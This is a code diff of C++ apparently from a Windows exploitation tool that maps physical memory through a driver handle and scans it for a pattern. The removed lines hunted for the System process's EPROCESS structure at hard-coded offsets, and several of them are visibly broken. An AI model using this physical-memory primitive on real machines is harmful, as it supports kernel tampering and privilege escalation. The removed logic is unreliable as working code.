@@ -102,6 +102,7 @@ int GetDevicePhysicalMemoryHandle(LPCWSTR driverName, HANDLE* hPhysicalMemory) {
 
 int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength, HANDLE hPhysicalMemory, std::vector <unsigned __int64>& locations) {
 	int memRegionsCount = -1;
+	printf("[ ] Search for pattern: \"%s\"\n", pattern);
 
 	memRegionsCount = GetPhysicalMemoryLayout(NULL);
 	if (memRegionsCount == -1) {
@@ -119,11 +120,11 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 		return -1;
 	}
 
-	printf("physical memory regions\n");
+	printf("[+] Physical memory regions\n");
 	for (int i = 0; i < memRegionsCount; i++) {
 		printf("%p - %p\n", (void*)memRegion[i].address, (void*)(memRegion[i].address + memRegion[i].size));
 	}
-
+	printf("\n[ ]Scanning through each physical memory region...\n");
 
 	PVOID* buf = (PVOID*)malloc(0x1000);
 	if (buf == 0) {
@@ -133,6 +134,7 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 	if (fourPages == 0) {
 		exit(EXIT_FAILURE);
 	}
+
 	// go through mapped physical memory regions
 	for (int i = 0; i < memRegionsCount; i++) {
 		unsigned __int64 start = memRegion[i].address;
@@ -149,64 +151,14 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 			PVOID castedBuf = *buf;
 			int offset2 = 0;
 			// go through page byte by byte and search for pattern
-			for (unsigned int offset = 0; offset < (0xfff - patternLength); offset++) {
-
-				offset2++;
+			for (unsigned int offset = 0; offset < (0xfff - patternLength); offset++)
+			{
 				castedBuf = (unsigned char*)castedBuf + 1;
 				if (memcmp(castedBuf, pattern, patternLength) == 0)
 				{
 					unsigned __int64 patternLocation = page + offset;
-					unsigned char* EPROCESSBaseOfSystem = (unsigned char*)castedBuf - 0x5A7;
-					unsigned char* UniqueProcessId = EPROCESSBaseOfSystem + 0x440;
-					// check buf bounds
-					if ((unsigned __int64)buf <= (unsigned __int64)UniqueProcessId && (unsigned __int64)UniqueProcessId <= (unsigned __int64)buf)
-					{
-						if (memcmp(UniqueProcessId, "0x0000000000000004", 8) == 0)
-						{
-							// PID of System is 4
-							locations.push_back(patternLocation);
-							printf("\nFound pattern at: %p\n", (void*)(page + offset));
-						}
-					}
-					else
-					{
-						fprintf(stderr, "Struct does not fit into one page. Try mapping 4 pages.\n");
-
-						if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page - 0x2000, 0x4000, fourPages) == FALSE) {
-							fprintf(stderr, "[!] MapPhysicalMemory failed");
-							return -1;
-						}
-						patternLocation = page + offset;
-						// get middle of fourPages
-						PVOID castedFourPages = *fourPages;
-						castedFourPages = (unsigned char*)castedFourPages + 0x2000;
-						// now castedFourPages and *buf point to the same memory
-						printf("\nFound pattern at: %p\n", (void*)(page + offset));
-	
-						// add pattern offset
-						castedFourPages = (unsigned char*)castedFourPages + offset;
-
-						EPROCESSBaseOfSystem = (unsigned char*)castedFourPages - 0x5A7;
-
-						UniqueProcessId = EPROCESSBaseOfSystem + 0x440; // don't know why the -1 is necessary (offset from windbg)
-						if ( 1 == 1 || (unsigned __int64)castedFourPages <= (unsigned __int64)UniqueProcessId && (unsigned __int64)UniqueProcessId <= (unsigned __int64)castedFourPages)
-						{
-							printf("Struct does fit into four pages.\n");
-							//                             0400000000000000
-							unsigned __int64 right = *((unsigned __int64*)UniqueProcessId);
-							if (right == 0x4)
-							{
-								// PID of System is 4
-								locations.push_back(patternLocation);
-								printf("\nFound pattern at: %p\n", (void*)(page + offset));
-							}
-						}
-						else
-						{
-							fprintf(stderr, "Struct does not fit into four page.\n");
-						}
-					}
-
+					locations.push_back(patternLocation);
+					printf("[ ] Found pattern at: %p\n", (void*)(page + offset));
 				}
 			}
 			if (UnmapPhysicalMemory(buf) == FALSE) {
@@ -215,8 +167,9 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 			}
 		}
 	}
+	printf("[+] Scanned through every physical memory region\n");
+
 	free(memRegion);
-	free(fourPages);
 	free(buf);
 	return 0;
 }
